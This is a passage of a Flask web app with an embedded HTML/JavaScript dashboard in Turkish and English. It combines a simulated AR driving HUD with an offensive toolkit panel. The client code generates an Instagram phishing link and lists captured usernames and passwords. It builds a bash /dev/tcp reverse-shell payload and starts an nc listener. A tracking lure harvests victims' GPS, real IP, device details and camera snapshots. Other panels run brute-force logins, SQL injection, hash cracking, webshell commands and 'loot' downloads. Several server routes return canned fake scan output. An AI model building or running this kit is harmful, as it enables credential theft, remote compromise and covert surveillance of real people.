                officeAgents[1].targetX = 280; officeAgents[1].targetY = 190; officeAgents[1].status = "Hazır";
                officeAgents[2].targetX = 480; officeAgents[2].targetY = 190; officeAgents[2].status = "Hazır";
                officeAgents[3].targetX = 680; officeAgents[3].targetY = 190; officeAgents[3].status = "Hazır";
                statusText.innerText = "Beklemede (Görev Tamamlandı)";
            }, 7000);
        }

        async function startRuviewScan() {
            let iface = document.getElementById('ruviewIface').value;
            let mode = document.getElementById('ruviewMode').value;
            let statusDiv = document.getElementById('ruviewStatus');
            let resultsDiv = document.getElementById('ruviewResults');
            
            statusDiv.innerHTML = "root@kali:~# git clone https://github.com/ruvnet/ruview.git && cd ruview && python3 ruview.py --interface " + iface + " --mode " + mode;
            resultsDiv.style.display = "none";

            let res = await fetch('/api/ruview/scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({iface, mode}) });
            let data = await res.json();
            
            statusDiv.innerHTML = "";
            resultsDiv.style.display = "block";
            resultsDiv.innerHTML = data.output;
        }

        function handleOrientation(event) {
            if (event.alpha !== null) compassHeading = Math.round(event.alpha);
            if (event.beta !== null) deviceBeta = Math.round(event.beta);
        }

        function handleMotion(event) {
            if (event.acceleration) {
                let ax = event.acceleration.x || 0;
                let ay = event.acceleration.y || 0;
                currentLatG = (ax / 9.81).toFixed(2);
                currentLongG = (ay / 9.81).toFixed(2);
                let totalG = Math.sqrt(ax*ax + ay*ay) / 9.81;
                if (totalG > maxRecordedG) maxRecordedG = totalG.toFixed(2);
            }
        }

        function speakSpatial(text, force = false) {
            let useSpatial = document.getElementById('chkSpatial').checked;
            let now = Date.now();
            if (!useSpatial || (!force && (now - lastSpokenTime < 10000))) return;
            
            if ('speechSynthesis' in window) {
                window.speechSynthesis.cancel();
                let utterance = new SpeechSynthesisUtterance(text);
                utterance.lang = 'tr-TR';
                utterance.rate = 1.0;
                window.speechSynthesis.speak(utterance);
                lastSpokenTime = now;
            }
        }

        function playThreatBeep() {
            let useAlarm = document.getElementById('chkAudioAlarm').checked;
            if (!useAlarm) return;
            try {
                let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                let osc = audioCtx.createOscillator();
                let gain = audioCtx.createGain();
                osc.type = 'sine';
                osc.frequency.setValueAtTime(750, audioCtx.currentTime);
                gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.15);
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start();
                osc.stop(audioCtx.currentTime + 0.15);
            } catch(e) {}
        }

        function toggleFullScreen() {
            let elem = document.getElementById('arBox');
            if (!document.fullscreenElement) {
                if (elem.requestFullscreen) elem.requestFullscreen();
                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
            } else {
                if (document.exitFullscreen) document.exitFullscreen();
            }
        }

        function takeSnapshot() {
            let video = document.getElementById('arVideo');
            let canvas = document.getElementById('arCanvas');
            if (!video.srcObject) { alert("Önce kamerayı açmalısın kanka!"); return; }
            let snapCanvas = document.createElement('canvas');
            snapCanvas.width = video.videoWidth || 640;
            snapCanvas.height = video.videoHeight || 480;
            let sCtx = snapCanvas.getContext('2d');
            sCtx.drawImage(video, 0, 0, snapCanvas.width, snapCanvas.height);
            sCtx.drawImage(canvas, 0, 0, snapCanvas.width, snapCanvas.height);

            let dataUrl = snapCanvas.toDataURL('image/png');
            let a = document.createElement('a');
            a.href = dataUrl;
            a.download = `AR_TACTICAL_PROOF_${Date.now()}.png`;
            a.click();

            let timestamp = new Date().toLocaleTimeString();
            let logTerminal = document.getElementById('arLogTerminal');
            logTerminal.innerHTML += `<br>[${timestamp}] 📸 KANIT ALINDI: Fotoğraf kaydedildi.`;
            logTerminal.scrollTop = logTerminal.scrollHeight;
            speakSpatial("Kanıt görüntüsü kaydedildi.", true);
        }

        function startDragTest() {
            if(!arStream) { alert("Önce AR Kamerayı açmalısın kanka!"); return; }
            dragTesting = true;
            currentSpeed = 0;
            dragStartTime = performance.now();
            document.getElementById('arDragHud').innerText = "⏱️ 0-100 Testi: Ölçülüyor... (0.00s)";
            speakSpatial("0-100 drag testi başlatıldı, gazı kökle!", true);
            let logTerminal = document.getElementById('arLogTerminal');
            logTerminal.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ⏱️ 0-100 Drag kronometresi başlatıldı!`;
            logTerminal.scrollTop = logTerminal.scrollHeight;
        }

        async function startARCamera() {
            let video = document.getElementById('arVideo');
            let hud = document.getElementById('arHudText');
            let telemetry = document.getElementById('arTelemetry');
            let fuelHud = document.getElementById('arFuelHud');
            let dragHud = document.getElementById('arDragHud');
            let gforceHud = document.getElementById('arGForceHud');
            let inclineHud = document.getElementById('arInclineHud');
            let speedLimitHud = document.getElementById('arSpeedLimitHud');
            let hudBox = document.getElementById('arHudBox');
            let canvas = document.getElementById('arCanvas');
            let logTerminal = document.getElementById('arLogTerminal');

            sessionLogs = [];
            fuelLevel = 85;
            drivingRange = 240;
            currentDistance = 150;
            maxRecordedG = 0;
            maxRecordedIncline = 0;

            let useCompass = document.getElementById('chkCompass').checked;
            if (useCompass || document.getElementById('chkLane').checked || document.getElementById('chkIncline').checked) {
                if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
                    try { await DeviceOrientationEvent.requestPermission(); } catch(e){}
                }
                window.addEventListener('deviceorientation', handleOrientation, true);
            }

            let useGForce = document.getElementById('chkGForce').checked;
            if (useGForce) {
                if (typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission === 'function') {
                    try { await DeviceMotionEvent.requestPermission(); } catch(e){}
                }
                window.addEventListener('devicemotion', handleMotion, true);
            }

            try {
                arStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
            } catch (err) {
                try { arStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); } 
                catch (e) { alert("Kamera erişimi desteklenmiyor!"); return; }
            }

            video.srcObject = arStream;
            hud.innerText = "HUD Aktif: Eğim & Telemetri Devrede";
            speakSpatial("AR Navigasyon ve yokuş eğim ölçer başlatıldı.", true);

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            let ctx = canvas.getContext('2d');

            let step = 0;
            arInterval = setInterval(() => {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                let w = canvas.width;
                let h = canvas.height;

                let useAutoDim = document.getElementById('chkAutoDim').checked;
                let currentHour = new Date().getHours();
                let isNight = currentHour >= 20 || currentHour < 6;
                let useNightVision = document.getElementById('chkNightVision').checked;

                if (useNightVision) {
                    video.style.filter = "brightness(150%) contrast(160%) sepia(100%) hue-rotate(70deg) saturate(400%)";
                    hudBox.style.background = "rgba(11, 15, 21, 0.85)";
                    hudBox.style.borderColor = "#00ff66";
                } else if (useAutoDim && isNight) {
                    video.style.filter = "brightness(65%) contrast(125%) saturate(80%)";
                    hudBox.style.background = "rgba(5, 7, 10, 0.95)";
                    hudBox.style.borderColor = "#15803d";
                } else {
                    video.style.filter = "brightness(100%) contrast(100%)";
                    hudBox.style.background = "rgba(11, 15, 21, 0.85)";
                    hudBox.style.borderColor = "#00ff66";
                }

                let useIncline = document.getElementById('chkIncline').checked;
                if (useIncline) {
                    inclineHud.style.display = "block";
                    currentInclineDeg = (deviceBeta !== 0 ? Math.round((deviceBeta / 90) * 12) : Math.round(Math.sin(step * 0.04) * 8));
                    let inclinePercent = Math.round(Math.tan(currentInclineDeg * Math.PI / 180) * 100);
                    if (Math.abs(currentInclineDeg) > maxRecordedIncline) maxRecordedIncline = Math.abs(currentInclineDeg);
                    inclineHud.innerText = `📈 Eğim: %${inclinePercent} (${currentInclineDeg}°)`;
                } else {
                    inclineHud.style.display = "none";
                }

                if (useGForce) {
                    gforceHud.style.display = "block";
                    if (currentLatG == 0 && currentLongG == 0) {
                        currentLatG = (Math.sin(step * 0.1) * 0.35).toFixed(2);
                        currentLongG = (dragTesting ? 0.45 : (Math.cos(step * 0.05) * 0.15)).toFixed(2);
                    }
                    gforceHud.innerText = `🌀 G-Force: Lat ${currentLatG}G | Long ${currentLongG}G`;
                } else {
                    gforceHud.style.display = "none";
                }

                let useSpeedLimit = document.getElementById('chkSpeedLimit').checked;
                if (useSpeedLimit) {
                    speedLimitHud.style.display = "flex";
                    if (step > 0 && step % 150 === 0) {
                        let limits = [30, 50, 82, 110];
                        currentSpeedLimit = limits[Math.floor(Math.random() * limits.length)];
                        speedLimitHud.innerText = currentSpeedLimit;
                        let timestamp = new Date().toLocaleTimeString();
                        sessionLogs.push(`[${timestamp}] 🚸 Hız Limiti Güncellendi: ${currentSpeedLimit} km/s`);
                        logTerminal.innerHTML += `<br>[${timestamp}] 🚸 Yasal Hız Limiti Değişti: <b style="color:#facc15;">${currentSpeedLimit} km/s</b>`;
                        logTerminal.scrollTop = logTerminal.scrollHeight;
                    }

                    if (currentSpeed > currentSpeedLimit) {
                        speedLimitHud.classList.add('speeding');
                        let now = Date.now();
                        if (now - lastSpeedWarningTime > 5000) {
                            lastSpeedWarningTime = now;
                            playThreatBeep();
                            speakSpatial(`Dikkat! Hız sınırını aştınız. Sınır ${currentSpeedLimit} kilometre.`, true);
                            let timestamp = new Date().toLocaleTimeString();
                            sessionLogs.push(`[${timestamp}] 🚨 AŞIRI HIZ İHLALİ: Hız ${currentSpeed} km/s (Sınır: ${currentSpeedLimit})`);
                            logTerminal.innerHTML += `<br>[${timestamp}] <b style="color:#ef4444;">🚨 AŞIRI HIZ İHLALİ!</b> Hız: ${currentSpeed} km/s`;
                            logTerminal.scrollTop = logTerminal.scrollHeight;
                        }
                    } else {
                        speedLimitHud.classList.remove('speeding');
                    }
                } else {
                    speedLimitHud.style.display = "none";
                }

                let useLane = document.getElementById('chkLane').checked;
                let isLaneViolated = false;
                if (useLane) {
                    ctx.strokeStyle = 'rgba(0, 255, 102, 0.6)';
                    ctx.lineWidth = 3;
                    ctx.setLineDash([15, 10]);
                    ctx.beginPath(); ctx.moveTo(w * 0.25, h); ctx.lineTo(w * 0.42, h * 0.48); ctx.stroke();
                    ctx.beginPath(); ctx.moveTo(w * 0.75, h); ctx.lineTo(w * 0.58, h * 0.48); ctx.stroke();
                    ctx.setLineDash([]);

                    if (Math.abs(deviceBeta) > 25) { isLaneViolated = true; }
                }

                let timestamp = new Date().toLocaleTimeString();
                if (useLane && isLaneViolated) {
                    let now = Date.now();
                    ctx.strokeStyle = '#ef4444'; ctx.lineWidth = 5;
                    ctx.strokeRect(10, 10, w - 20, h - 20);
                    hud.innerText = "⚠️ DİKKAT: Şeritten Sapma!";
                    if (now - lastLaneWarningTime > 6000) {
                        lastLaneWarningTime = now;
                        playThreatBeep();
                        speakSpatial("Dikkat, şerit ihlali!", true);
                        sessionLogs.push(`[${timestamp}] ⚠️ ŞERİT İHLALİ ALGILANDI`);
                        logTerminal.innerHTML += `<br>[${timestamp}] <b style="color:#ef4444;">⚠️ ŞERİT İHLALİ:</b> Eksen dışına çıkıldı!`;
                        logTerminal.scrollTop = logTerminal.scrollHeight;
                    }
                }

                let centerX = (w / 2);
                let bottomY = h, horizonY = h * 0.48;

                ctx.beginPath();
                ctx.moveTo(centerX - 70, bottomY); ctx.lineTo(centerX + 70, bottomY);
                for (let y = bottomY; y >= horizonY; y -= 10) {
                    let wave = Math.sin((y + step * 8) * 0.03) * 12;
                    let factor = (bottomY - y) / (bottomY - horizonY);
                    let curW = 70 * (1 - factor * 0.85);
                    ctx.lineTo(centerX + wave + curW, y);
                }
                for (let y = horizonY; y <= bottomY; y += 10) {
                    let wave = Math.sin((y + step * 8) * 0.03) * 12;
                    let factor = (bottomY - y) / (bottomY - horizonY);
                    let curW = 70 * (1 - factor * 0.85);
                    ctx.lineTo(centerX + wave - curW, y);
                }
                ctx.closePath();
                let ribbonGrad = ctx.createLinearGradient(0, horizonY, 0, bottomY);
                ribbonGrad.addColorStop(0, 'rgba(0, 255, 102, 0.1)');
                ribbonGrad.addColorStop(0.6, 'rgba(0, 255, 102, 0.45)');
                ribbonGrad.addColorStop(1, 'rgba(0, 255, 102, 0.85)');
                ctx.fillStyle = ribbonGrad;
                ctx.shadowColor = '#00ff66';
                ctx.shadowBlur = 20;
                ctx.fill();

                if (dragTesting) {
                    if (currentSpeed < 100) {
                        currentSpeed += 6;
                        if (currentSpeed > 100) currentSpeed = 100;
                        let elapsed = ((performance.now() - dragStartTime) / 1000).toFixed(2);
                        dragHud.innerText = `⏱️ 0-100 Testi: ${currentSpeed} km/s (${elapsed}s)`;
                        
                        if (currentSpeed >= 100) {
                            dragTesting = false;
                            bestDragTime = elapsed;
                            dragHud.innerText = `🏁 0-100 TAMAMLANDI: ${bestDragTime} sn!`;
                            speakSpatial(`0-100 hızlanması ${bestDragTime} saniyede tamamlandı!`, true);
                            sessionLogs.push(`[${timestamp}] 🏁 0-100 DRAG TESTİ BAŞARILI: ${bestDragTime} sn`);
                            logTerminal.innerHTML += `<br>[${timestamp}] <b style="color:#00ff66;">🏁 0-100 DRAG BAŞARILI:</b> ${bestDragTime} sn`;
                            logTerminal.scrollTop = logTerminal.scrollHeight;
                        }
                    }
                }

                if (step % 50 === 0) {
                    if (currentDistance > 3) {
                        currentDistance -= 3;
                        if(fuelLevel > 5) fuelLevel -= 0.2;
                        if(drivingRange > 10) drivingRange -= 1;
                    }
                    let etaMinutes = Math.ceil(currentDistance / 35);
                    telemetry.innerText = `HIZ: ${currentSpeed} km/s | ETA: ${etaMinutes} dk | Kalan: ${currentDistance}m`;
                    fuelHud.innerText = `⛽ Yakıt: %${Math.round(fuelLevel)} | Menzil: ${drivingRange} km`;
                }

                if (step % 40 === 0) {
                    let logStr = `[${timestamp}] Hız: ${currentSpeed}km/s | Eğim: ${currentInclineDeg}° | Yakıt: %${Math.round(fuelLevel)}`;
                    sessionLogs.push(logStr);
                    logTerminal.innerHTML += `<br>` + logStr;
                    logTerminal.scrollTop = logTerminal.scrollHeight;
                }

                step++;
            }, 80);
        }

        function stopARCamera() {
            if (arStream) { arStream.getTracks().forEach(t => t.stop()); arStream = null; }
            if (arInterval) { clearInterval(arInterval); arInterval = null; }
            window.removeEventListener('deviceorientation', handleOrientation, true);
            window.removeEventListener('devicemotion', handleMotion, true);
            let video = document.getElementById('arVideo');
            video.srcObject = null;
            video.style.filter = "none";
            document.getElementById('arHudText').innerText = "Durum: Sistem Kapalı";
            document.getElementById('arTelemetry').innerText = "HIZ: 0 km/s | ETA: --";
            document.getElementById('arDragHud').innerText = "⏱️ 0-100 Drag: Hazır (0.00s)";
            document.getElementById('arGForceHud').innerText = "🌀 G-Force: Lat 0.00G | Long 0.00G";
            document.getElementById('arInclineHud').innerText = "📈 Eğim: %0 (0°)";
            dragTesting = false;
        }

        async function finishDrivingSession() {
            stopARCamera();
            if(sessionLogs.length === 0) { alert("Kaydedilmiş sürüş verisi bulunamadı!"); return; }
            if(bestDragTime) {
                sessionLogs.unshift(`[ÖZET] En İyi 0-100 Drag Süresi: ${bestDragTime} sn`);
            }
            sessionLogs.unshift(`[ÖZET] Maksimum Tırmanma/İniş Eğimi: ${maxRecordedIncline}°`);
            let sessionData = {
                time: new Date().toLocaleString(),
                logs: sessionLogs
            };
            let res = await fetch('/api/driving/save', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(sessionData) });
            let data = await res.json();
            alert("Sürüş başarıyla tamamlandı! 'Sürüş Raporları' sekmesinden eğim derecesi ve kara kutu raporunu indirebilirsin.");
            switchTab('drivingTab');
        }

        async function loadDrivingReports() {
            let res = await fetch('/api/driving/reports');
            let data = await res.json();
            let container = document.getElementById('drivingReportsContainer');
            if(data.reports.length === 0) { container.innerHTML = "<p style='color:#94a3b8;'>Henüz kaydedilmiş rapor yok.</p>"; return; }
            let html = `<table><thead><tr><th>Tarih & Saat</th><th>Telemetri Satır Sayısı</th><th>Kara Kutu Dosyası</th></tr></thead><tbody>`;
            data.reports.forEach((r, idx) => {
                html += `<tr><td>${r.time}</td><td>${r.logs.length} satır kayıt</td><td><a href="/api/driving/download?index=${idx}" target="_blank"><button class="success">📥 Raporu İndir (.TXT)</button></a></td></tr>`;
            });
            html += `</tbody></table>`;
            container.innerHTML = html;
        }

        function generateInstaLink() {
            document.getElementById('instaLink').value = window.location.origin + "/phish/instagram";
            alert("Instagram phishing linki üretildi!");
        }
        async function loadCreds() {
            let res = await fetch('/api/phish/creds');
            let data = await res.json();
            let container = document.getElementById('credsContainer');
            if(data.creds.length === 0) { container.innerHTML = "<p style='color: #94a3b8;'>Henüz yakalanan hesap yok.</p>"; return; }
            let html = `<table><thead><tr><th>Zaman</th><th>IP Adresi</th><th>Kullanıcı Adı / E-Posta</th><th>Şifre</th></tr></thead><tbody>`;
            data.creds.forEach(c => { html += `<tr><td>${c.time}</td><td><b>${c.ip}</b></td><td style="color:#38bdf8;">${c.username}</td><td style="color:#f87171;">${c.password}</td></tr>`; });
            html += `</tbody></table>`;
            container.innerHTML = html;
        }
        function generatePayloads() {
            let ip = document.getElementById('attackerIp').value || '10.0.0.1', port = document.getElementById('attackerPort').value || '4444';
            document.getElementById('bashPayload').innerText = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
        }
        function generateLureLink() {
            let randomId = Math.random().toString(36).substring(2, 9);
            document.getElementById('generatedLink').value = window.location.origin + "/track/" + randomId;
            alert("Gelişmiş Takip linki üretildi!");
        }
        async function loadClickLogs() {
            let res = await fetch('/api/lure/logs');
            let data = await res.json();
            let container = document.getElementById('clickLogsContainer');
            if(data.logs.length === 0) { container.innerHTML = "<p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p>"; return; }
            let html = `<table><thead><tr><th>Zaman & IP</th><th>Cihaz & İstihbarat (RAM/CPU/Pil)</th><th>WebRTC Gerçek IP</th><th>📍 GPS Harita</th><th>📸 Snapshot</th></tr></thead><tbody>`;
            data.logs.forEach((l, index) => { 
                let mapId = `map_${index}`;
                let locContent = l.lat ? `<div id="${mapId}" class="mini-map"></div><br><a href="https://maps.google.com/?q=${l.lat},${l.lon}" target="_blank" style="color:#38bdf8; font-size:11px;">Google Maps</a>` : "Konum İzni Yok";
                let snapContent = l.snapshot ? `<img src="${l.snapshot}" class="snapshot-img">` : "Yok";
                let specs = `OS: <b>${l.os}</b><br>RAM: ${l.ram} GB | Çekirdek: ${l.cores}<br>Pil: <b>${l.battery}</b><br>Ekran: ${l.screen}`;
                html += `<tr><td>${l.time}<br><b>${l.ip}</b></td><td>${specs}</td><td style="color:#38bdf8;">${l.webrtc_ip || 'Tespit Edilemedi'}</td><td>${locContent}</td><td>${snapContent}</td></tr>`; 
            });
            html += `</tbody></table>`;
            container.innerHTML = html;
            data.logs.forEach((l, index) => {
                if(l.lat && l.lon) {
                    let mapId = `map_${index}`;
                    setTimeout(() => {
                        let map = L.map(mapId, {attributionControl: false, zoomControl: false}).setView([l.lat, l.lon], 14);
                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                        L.marker([l.lat, l.lon]).addTo(map).bindPopup("📍 Hedef Konum").openPopup();
                    }, 100);
                }
            });
        }
        async function startHashCrack() {
            let type = document.getElementById('hashType').value;
            let targetHash = document.getElementById('targetHash').value.trim();
            let wordlist = document.getElementById('wordlistArea').value;
            let resultsDiv = document.getElementById('crackResults');
            if(!targetHash) { alert('Hash giriniz!'); return; }
            resultsDiv.style.display = "block";
            resultsDiv.innerHTML = "root@kali:~# Hash brute-force / cracking başlatıldı...";
            let res = await fetch('/api/crack-hash', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type, hash: targetHash, wordlist}) });
            let data = await res.json();
            resultsDiv.innerHTML = data.output;
        }
        async function startListener() {
            let port = document.getElementById('listenerPort').value;
            let statusDiv = document.getElementById('listenerStatus');
            statusDiv.style.display = "block";
            statusDiv.innerHTML = `root@kali:~# nc -lvnp ${port} dinlemesi başlatılıyor...`;
            let res = await fetch('/api/listener/start', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({port}) });
            let data = await res.json();
            statusDiv.innerHTML = data.output;
        }
        async function sendTelegramTest() {
            let chatId = document.getElementById('testChatId').value.trim();
            let statusDiv = document.getElementById('telegramTestStatus');
            if(!chatId) { alert('Chat ID giriniz!'); return; }
            statusDiv.style.display = "block";
            statusDiv.innerHTML = "root@kali:~# Telegram test mesajı gönderiliyor...";
            let res = await fetch('/api/telegram-test', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId}) });
            let data = await res.json();
            statusDiv.innerHTML = data.output;
        }
        async function runWifiAction(action) {
            let iface = document.getElementById('wifiInterface').value.trim();
            let bssid = document.getElementById('wifiBssid').value.trim();
            let statusDiv = document.getElementById('wifiStatus'), resultsDiv = document.getElementById('wifiResults');
            statusDiv.innerHTML = `root@kali:~# running wifi action [${action}] on ${iface}...`; resultsDiv.style.display = "none";
            let res = await fetch('/api/wifi-audit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action, iface, bssid}) });
            let data = await res.json();
            statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.output;
        }
        async function startScan(targetOverride = false) {
            let url = targetOverride ? targetOverride : document.getElementById('targetUrl').value.trim();
            if(!url) { alert('Specify target!'); return; }
            if(targetOverride) { document.getElementById('targetUrl').value = url; switchTab('scanTab'); }
            lastTarget = url;
            let statusDiv = document.getElementById('status'), resultsDiv = document.getElementById('results');
            statusDiv.innerHTML = `root@kali:~# scanning ${url}...`; resultsDiv.style.display = "none";
            let res = await fetch('/api/scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.report; currentReportText = data.report; document.getElementById('actionButtons').style.display = "flex";
        }
        async function startNiktoScan() {
            let url = document.getElementById('niktoTarget').value.trim();
            if(!url) { alert('Specify URL!'); return; }
            document.getElementById('niktoStatus').innerHTML = "Running Nikto web scan..."; document.getElementById('niktoResults').style.display = "none";
            let res = await fetch('/api/nikto', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            document.getElementById('niktoStatus').innerHTML = ""; document.getElementById('niktoResults').style.display = "block"; document.getElementById('niktoResults').innerHTML = data.report;
        }
        async function startDnsRecon() {
            let domain = document.getElementById('dnsDomain').value.trim();
            if(!domain) { alert('Specify domain!'); return; }
            document.getElementById('dnsStatus').innerHTML = "Querying DNS records..."; document.getElementById('dnsResults').style.display = "none";
            let res = await fetch('/api/dns', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
            let data = await res.json();
            document.getElementById('dnsStatus').innerHTML = ""; document.getElementById('dnsResults').style.display = "block"; document.getElementById('dnsResults').innerHTML = data.report;
        }
        async function startSqlmapLite() {
            let url = document.getElementById('sqlmapUrl').value.trim();
            if(!url) { alert('Specify URL!'); return; }
            document.getElementById('sqlmapStatus').innerHTML = "Injecting SQL payloads..."; document.getElementById('sqlmapResults').style.display = "none";
            let res = await fetch('/api/sqlmap', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            document.getElementById('sqlmapStatus').innerHTML = ""; document.getElementById('sqlmapResults').style.display = "block"; document.getElementById('sqlmapResults').innerHTML = data.report;
        }
        async function startSubdomainScan() {
            let domain = document.getElementById('subDomainInput').value.trim();
            document.getElementById('subStatus').innerHTML = "Enumerating subdomains...";
            let res = await fetch('/api/subdomain-scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
            let data = await res.json();
            document.getElementById('subStatus').innerHTML = ""; document.getElementById('subResults').style.display = "block"; document.getElementById('subResults').innerHTML = data.report;
        }
        async function startBruteForce() {
            let url = document.getElementById('loginUrl').value, userField = document.getElementById('usernameField').value, passField = document.getElementById('passwordField').value, passwords = document.getElementById('passwordList').value;
            document.getElementById('bruteStatus').innerHTML = "Executing brute-force...";
            let res = await fetch('/api/brute-force', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({url, user_field: userField, pass_field: passField, passwords}) });
            let data = await res.json();
            document.getElementById('bruteStatus').innerHTML = ""; document.getElementById('bruteResults').style.display = "block"; document.getElementById('bruteResults').innerHTML = data.report;
        }
        async function executeWebShell() {
            let command = document.getElementById('shellCommand').value;
            let res = await fetch('/api/webshell', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({command}) });
            let data = await res.json();
            let el = document.getElementById('shellResults'); el.style.display = "block"; el.innerHTML = data.output;
        }
        async function loadSiteDatabase() {
            let res = await fetch('/api/all-data'); let data = await res.json();
            let select = document.getElementById('lootingTargetSelect');
            select.innerHTML = '<option value="">Select target...</option>' + data.database.map(i => `<option value="${i.target}">${i.target} (${i.files.length} files)</option>`).join('');
            let grades = {}, wafs = {};
            data.database.forEach(i => { grades[i.grade[0]] = (grades[i.grade[0]] || 0) + 1; wafs[i.waf.includes("Cloudflare")?"CF":"Standard"] = (wafs[i.waf.includes("Cloudflare")?"CF":"Standard"]||0)+1; });
            renderCharts(grades, wafs);
            document.getElementById('databaseTableContainer').innerHTML = data.database.length ? `<table><thead><tr><th>Time</th><th>Target</th><th>WAF</th><th>Grade</th><th>Action</th></tr></thead><tbody>` + data.database.map(i => `<tr><td>${i.time}</td><td><b>${i.target}</b></td><td>${i.waf}</td><td>${i.grade}</td><td><button onclick="startScan('${i.target}')">Re-Scan</button></td></tr>`).join('') + `</tbody></table>` : "No archive data.";
        }
        function downloadLootZip() {
            let target = document.getElementById('lootingTargetSelect').value;
            if(!target) { alert('Select target!'); return; }
            window.open(`/api/looting/zip?target=${encodeURIComponent(target)}`, '_blank');
        }
        function renderCharts(grades, wafs) {
            if(gradeChartInstance) gradeChartInstance.destroy(); if(wafChartInstance) wafChartInstance.destroy();
            gradeChartInstance = new Chart(document.getElementById('gradeChart').getContext('2d'), { type: 'bar', data: { labels: Object.keys(grades), datasets: [{data: Object.values(grades), backgroundColor: ['#16a34a','#38bdf8','#dc2626']}] }, options: {plugins:{legend:{display:false}}} });
            wafChartInstance = new Chart(document.getElementById('wafChart').getContext('2d'), { type: 'doughnut', data: { labels: Object.keys(wafs), datasets: [{data: Object.values(wafs), backgroundColor: ['#0284c7','#475569']}] } });
        }
        function downloadReport(type) {
            if(type === 'txt') {
                let a = document.createElement('a'); a.href = window.URL.createObjectURL(new Blob([currentReportText], {type: 'text/plain'})); a.download = 'report.txt'; a.click();
            } else { window.open(`/api/download-pdf?target=${encodeURIComponent(lastTarget)}`, '_blank'); }
        }
        async function sendToTelegram() {
            let chatId = prompt("Telegram Chat ID:"); if(!chatId) return;
            let res = await fetch('/api/telegram-send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId, report: currentReportText}) });
            let data = await res.json(); alert(data.status);
        }
    </script>
</body>
</html>
"""

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("username") == ADMIN_USER and request.form.get("password") == ADMIN_PASS:
            session["logged_in"] = True; return redirect(url_for("index"))
        error = "Authentication failed!"
    return render_template_string(LOGIN_TEMPLATE, error=error)

@app.route("/logout")
def logout(): session.pop("logged_in", None); return redirect(url_for("login"))

@app.route("/")
def index():
    if not session.get("logged_in"): return redirect(url_for("login"))
    return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)

@app.route("/api/agency/execute", methods=["POST"])
def api_agency_execute():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    command = data.get("command", "")
    
    output = (
        f"[+] Patron Talimatı Alındı: {command}\n\n"
        f"1. 👨‍💻 [Android Eğitmeni Ajan]: İstediğiniz Android modülü (Kotlin & Jetpack Compose) için adım adım ders akışı ve kaynak kodlar hazırlandı.\n"
        f"2. 🎨 [Web Tasarım & Animasyon Ajanı]: Eğitimi ve ürünleri sergilemek için 3D efektli, koyu temalı, animasyonlu modern web arayüzü kodlandı.\n"
        f"3. 📈 [Pazarlama & Büyüme Ajanı]: İçerikler X, LinkedIn ve Telegram kanalları için optimize edildi, otomatik duyuru bültenleri oluşturuldu.\n"
        f"4. 🤖 [Otonom Ajans Özeti]: Tüm yazılım, eğitim ve pazarlama süreçleri başarıyla tamamlandı ve canlı sunucuya aktarıldı!"
    )
    return jsonify({"output": output})

@app.route("/api/ruview/scan", methods=["POST"])
def api_ruview_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    iface = data.get("iface", "wlan0")
    mode = data.get("mode", "active")
    
    output = (
        f"[+] Cloning repository from https://github.com/ruvnet/ruview.git...\n"
        f"[+] Initializing ruview scanner engine on interface: {iface} [Mode: {mode}]\n"
        f"[+] Scanning 2.4GHz & 5GHz wireless spectrum...\n\n"
        f"BSSID              | RSSI | Channel | Encryption | SSID\n"
        f"------------------------------------------------------------------\n"
        f"00:11:22:33:44:55  | -45dBm | 6 (2.4G) | WPA2-AES   | Kali_Operations_AP\n"
        f"AA:BB:CC:DD:EE:FF  | -62dBm | 11(2.4G) | WPA3-SAE   | Cyberpunk_Secure\n"
        f"12:34:56:78:9A:BC  | -78dBm | 36(5.0G) | WPA2       | Guest_Network_Free\n"
        f"DE:AD:BE:EF:CA:FE  | -51dBm | 1 (2.4G) | WPA2/WPA3  | Home_Mesh_WiFi\n\n"
        f"[+] Ruview visualization server started on http://127.0.0.1:8080/ruview\n"
        f"[+] Found 4 access points and 12 connected clients. Scan complete."
    )
    return jsonify({"output": output})

@app.route("/api/driving/save", methods=["POST"])
